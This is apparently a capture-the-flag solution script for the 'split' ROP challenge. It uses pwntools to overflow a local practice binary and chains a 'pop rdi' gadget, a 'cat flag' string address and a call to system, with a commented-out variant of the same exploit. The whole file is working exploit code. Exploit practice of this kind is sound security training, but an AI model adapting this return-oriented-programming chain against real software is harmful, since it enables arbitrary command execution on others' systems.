from pwn import *
p = process('./split')
# 
pop_rdi_ret= p64(0x00000000004007c3)
system = p64(0x000000000040074b)
cat_flag_str= p64(0x601060)
# 
# 
payload = b"a"*0x28 +pop_rdi_ret+ cat_flag_str+system
# 
p.sendline(payload)
p.interactive()

# from pwn import *

# system = 0x0000000000400810
# pop_rdi = 0x0000000000400883 # pop rdi; ret;
# userful_string = 0x0000000000601060

# rop  = b"A"*40
# rop += p64(pop_rdi)
# rop += p64(userful_string)
# rop += p64(system)

# p = process("./split")
# p.sendline(rop)
# p.interactive()